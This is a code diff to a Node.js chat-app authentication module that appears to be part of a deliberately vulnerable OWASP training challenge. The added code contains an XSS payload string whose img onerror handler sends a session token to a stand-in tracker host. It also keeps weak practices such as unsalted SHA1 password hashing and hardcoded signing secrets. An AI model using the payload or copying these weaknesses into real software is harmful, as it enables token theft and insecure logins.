@@ -14,8 +14,12 @@ const HDEN_AUTH_SECRET = AUTH_SECRETS[AUTH_SECRET_INDEX]
 
 
 authenticate = (req, resp) => {
-  var user = chatUsers[req.body.userName]; //get the user entry from the db
-  var userPassHash = user.passHash;
+  if(!req.body || !req.body.userName || !req.body.userPass){
+    resp.status(400)
+    return resp.send("Missing userName and/or userPass")
+  }
+  var user = chatUsers[req.body.userName]
+  var userPassHash = user.passHash
   var vfHash = crypto.createHash('sha1').update(req.body.userPass).digest('hex');
   if(userPassHash===vfHash){
     //generate JWT to identify this user
@@ -25,9 +29,8 @@ authenticate = (req, resp) => {
       permissions.add("messages")
     }
 
-    let tokenInfo = {"sub": req.body.userName,"name": user.name, "permissions":permissions}
-    
-    var token = jwt.sign(tokenInfo, HDEN_AUTH_SECRET);
+    let userInfo = {"sub": req.body.userName,"name": user.name, "permissions":permissions}
+    let token = sign(userInfo)
     resp.send({"token": token});
   }
   else{
@@ -35,6 +38,11 @@ authenticate = (req, resp) => {
     resp.send("Invalid credentials");
   }
 
+}
+
+sign = (userInfo) => {
+  var token = jwt.sign(userInfo, HDEN_AUTH_SECRET);
+  return token
 }
 
 getAuthorizedUser = async(req) => {
@@ -62,20 +70,24 @@ getAuthorizedUser = async(req) => {
 
 
 getCurrentUser = async(req, resp) => {
-  //validate the token 
+  if(!req.headers || (!req.headers.Authorization && !req.headers.authorization)){
+    resp.status(400)
+    return resp.send("Missing authorization header.")
+  }
 
+  //validate the token 
   let user = await getAuthorizedUser(req);
   
   if(user===null){
     resp.status(403)
-    return resp.send("Unauthorized")
+    return resp.send("No access to requested resource")
   }
 
   var challengeId = null;
   
   if(user.permissions && user.permissions.length > 0 && user.permissions.length < 10){
     for(let perm of user.permissions){
-      if(perm.indexOf("currentuser") >= 0){
+      if(perm.indexOf("currentuser") >= 0 && user.sub === "test"){
         challengeId = "owasp2017sensitive"
       } 
       else if(perm.indexOf("messages") >= 0){
@@ -88,16 +100,16 @@ getCurrentUser = async(req, resp) => {
   if(challengeId!==null){
     let challengeResponse = await challengeCode.getChallengeUrl(challengeId)
     user.challengeCodeUrl = challengeResponse.challengeCodeUrl
-    resp.send(user)
-     
   }
-  else{
-    resp.status(403)
-    return resp.send("Unauthorized")
-  }
+  resp.send(user)
 }
 
 getMessages = async(req,resp) => {
+  if(!req.headers || (!req.headers.Authorization && !req.headers.authorization)){
+    resp.status(400)
+    return resp.send("Missing authorization header.")
+  }
+
   let user = await getAuthorizedUser(req);
   
   if(user===null){
@@ -109,6 +121,17 @@ getMessages = async(req,resp) => {
 }
 
 postMessage = async(req,resp) => {
+  if(!req.headers || !req.body || (!req.headers.Authorization && !req.headers.authorization)){
+    resp.status(400)
+    return resp.send("Invalid request.")
+  }
+
+  var contentType = req.headers["content-type"];
+  if(!contentType || contentType!="application/json"){
+    resp.status(400)
+    return resp.send("Invalid content-type.")
+  }
+
   let user = await getAuthorizedUser(req);
   
   if(user===null){
@@ -121,16 +144,21 @@ postMessage = async(req,resp) => {
     let challengeResponse = await challengeCode.getChallengeUrl("owasp2017xss")
     let challengeCodeUrl = challengeResponse.challengeCodeUrl
     message = validateMessage(message, challengeCodeUrl)
+    if(message.error){
+      resp.status(400)
+      return resp.send(message.error)
+    }
   }
 
+  if(messages.length>1000) messages.splice(4,1)
   messages.push(message)
-  if(messages.length>1000) messages.pop()
+
   resp.send("Message received.")
 }
 
 validateMessage = (message, challengeCodeUrl) => {
   //check integrity
-  var toHash = "<img src='https://gov.logger.good' width='0px'>"+message.pubKey;
+  var toHash = "<img src=bla onerror=\"fetch('https://xss.tracker?token='+sessionStorage.token)\">"+message.pubKey;
   var hash = crypto.createHash('sha256').update(toHash).digest('hex');
 
   if(message.integrity===hash){
@@ -146,7 +174,7 @@ validateMessage = (message, challengeCodeUrl) => {
       message.nextChallenge = encrypt.encrypt("/ping");
   }
   else{
-      message.error = "Integrity check failed for:'"+JSON.stringify(message)+"'";
+      message.error = "Invalid encrypted message.";
   }
   return message;
 }
@@ -154,6 +182,7 @@ validateMessage = (message, challengeCodeUrl) => {
 
 module.exports = {
   authenticate,
+  sign,
   getAuthorizedUser,
   getCurrentUser,
   getMessages,
